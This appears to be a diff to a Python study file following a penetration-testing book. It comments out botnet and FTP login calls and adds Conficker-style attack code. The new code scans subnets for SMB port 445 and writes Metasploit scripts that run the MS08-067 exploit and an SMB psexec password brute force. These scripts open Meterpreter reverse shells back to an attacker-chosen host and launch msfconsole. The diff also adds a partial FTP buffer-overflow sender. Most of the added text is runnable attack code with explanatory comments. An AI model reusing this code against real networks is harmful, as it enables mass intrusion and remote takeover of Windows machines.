@@ -456,11 +456,11 @@ def botnet_command(command):
 
 
 bot_net = []
-add_client('10.10.10.110', 'root', 'toor')
-add_client('10.10.10.120', 'root', 'toor')
-add_client('10.10.10.130', 'root', 'toor')
-botnet_command('uname -v')
-botnet_command('cat /etc/issue')
+# add_client('10.10.10.110', 'root', 'toor')
+# add_client('10.10.10.120', 'root', 'toor')
+# add_client('10.10.10.130', 'root', 'toor')
+# botnet_command('uname -v')
+# botnet_command('cat /etc/issue')
 
 # This script is attacking servers directly, but there are other ways to go about it as well.
 # For example, let's study the k985ytv attack, which a botnet to inject JavaScript and
@@ -483,8 +483,8 @@ def anonymous_login(hostname):
         return False
 
 
-host = '192.168.95.179'
-anonymous_login(host)
+# host = '192.168.95.179'
+# anonymous_login(host)
 
 # If you really wanna get in, and the host doesn't enable anonymous login, you can
 # brute force credentials, which attackers have been quite successful with in the
@@ -568,7 +568,145 @@ def attack(username, password, tgtHost, redirect):
         fpt_injector(ftp, defPage, redirect)
 
 # The k985ytv was just all this code (with the addition of trying anonymous access first, and
-# if that fails, try the brute force version). In under 100 lines of python code, this 
-# interesting attack can be set up. Incredible. 
+# if that fails, try the brute force version). In under 100 lines of python code, this
+# interesting attack can be set up. Incredible.
 
-# The next attack we'll discuss compromised over 5 million workstations in 200 countries!
+# The next attack discuss in the book compromised over 5 million workstations in 200 countries!
+# A simple python script which repeats the process of scanning for an open port and creating a
+# Metasploit config file to attack the host.
+
+# Searches for all hosts within a subnet
+
+
+def find_targets(subnet):
+    nm_scan = nmap.PortScanner()
+    nm_scan.scan(subnet, '445')
+    target_hosts = []
+
+    for host in nm_scan.all_hosts():
+        if nm_scan[host].has_tcp(445):
+            state = nm_scan[host]['tcp'][445]['state']
+
+            if state == 'open':
+                print("[+] Found target host")
+                target_hosts.append(host)
+
+    return target_hosts
+
+
+# We can use MetaSploit's Meterpreter to analyze the infected target.
+# We have to setup a listener function, which will do the following:
+
+def setup_handler(config_file, lhost, lport):
+    config_file.write('use exploit/multi/handler\n')
+    config_file.write('set PAYLOAD ' +
+                      'windows/meterpreter/reverse_tcp\n')
+    config_file.write('set LPORT ' + str(lport) + '\n')
+    config_file.write('set LHOST ' + lhost + '\n')
+    config_file.write('exploit -j -z\n')
+    config_file.write('setg DisablePayloadHandler 1\n')
+
+
+def confickerExploit(configFile, tgtHost, lhost, lport):
+    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
+    configFile.write('set RHOST ' + str(tgtHost) + '\n')
+    configFile.write('set payload ' +
+                     'windows/meterpreter/reverse_tcp\n')
+    configFile.write('set LPORT ' + str(lport) + '\n')
+    configFile.write('set LHOST ' + lhost + '\n')
+    configFile.write('exploit -j -z\n')
+
+# Although this exploit has been successful in the past, we have created
+# security patches which will handle this easily. This is why the
+# conflicker worm used another attack vector in conjunction.
+# 1. Brute force SMB username/passwords
+# 2. Get access to remotely executed processes (psexec)
+# 3. If success, launch Meterpreter back to the local address and port
+
+
+def smb_brute(config_file, target_host, password_file, lhost, lport):
+    username = 'Administrator'
+    pf = open(password_file, 'r')
+
+    for password in pf.readlines():
+        password = password.strip('\n').strip('\r')
+        config_file.write('use exploit/windows/smb/psexec\n')
+        config_file.write('set SMBUser ' + str(username) + '\n')
+        config_file.write('set SMBPass ' + str(password) + '\n')
+        config_file.write('set RHOST ' + str(target_host) + '\n')
+        config_file.write('set PAYLOAD ' +
+                          'windows/meterpreter/reverse_tcp\n')
+        config_file.write('set LPORT ' + str(lport) + '\n')
+        config_file.write('set LHOST ' + lhost + '\n')
+        config_file.write('exploit -j -z\n')
+
+
+def conflicker_main():
+    config = open('meta.rc', 'w')
+    parser = optparse.OptionParser('[-] Usage%prog ' +
+                                   '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
+    parser.add_option('-H', dest='tgtHost', type='string',
+                      help='specify the target address[es]')
+    parser.add_option('-p', dest='lport', type='string',
+                      help='specify the listen port')
+    parser.add_option('-l', dest='lhost', type='string',
+                      help='specify the listen address')
+    parser.add_option('-F', dest='passwdFile', type='string',
+                      help='password file for SMB brute force attempt')
+    (options, _) = parser.parse_args()
+
+    if (options.tgtHost == None) | (options.lhost == None):
+        print(parser.usage)
+        exit(0)
+
+    lhost = options.lhost
+    lport = options.lport
+    if lport == None:
+        lport = '1337'
+
+    password_file = options.passwdFile
+    tgtHosts = find_targets(options.tgtHost)
+    setup_handler(config, lhost, lport)
+    for tgtHost in tgtHosts:
+        confickerExploit(config, tgtHost, lhost, lport)
+
+        if password_file != None:
+            smb_brute(config, tgtHost, password_file, lhost, lport)
+
+    config.close()
+    os.system('msfconsole -r meta.rc')
+
+# Buffer overflow attacks
+
+# These work by overwriting the next pointers of user input fields. Some essential aspects of a stack based
+# buffer overflow attack:
+# 1. Overflow: input which exceeds he expected value in the stack
+# 2. Return address: 4 byte address used to jump directly on top of the stack
+# 3. Padding: A series of NOP (no operation) instructions, which allows the attacker to guesstimate the
+#    next address to jump on.
+# 4. Shellcode: a piece of code written in Assembly, which can be generated from MetaSpoit
+
+# The idea is to connect to a port using sockets, authenticate to the host, and then send in the crash
+# variable.
+
+
+def buffer_attack(target, command, crash):
+    """ Above all this code exists some other code (including the padding, return, overflow, etc), which
+    hasn't been included here. Check out the book for more precise details. """
+
+    s = socket(AF_INET, SOCK_STREAM)
+    try:
+        s.connect((target, 21))
+    except:
+        exit(0)
+
+    s.send("USER anonymous\r\n")
+    s.recv(1024)
+    s.send("PASS \r\n")
+    s.recv(1024)
+    s.send(command + " " + crash + "\r\n")
+    time.sleep(4)
+
+#####################################################################
+# Chapter 3
+#####################################################################
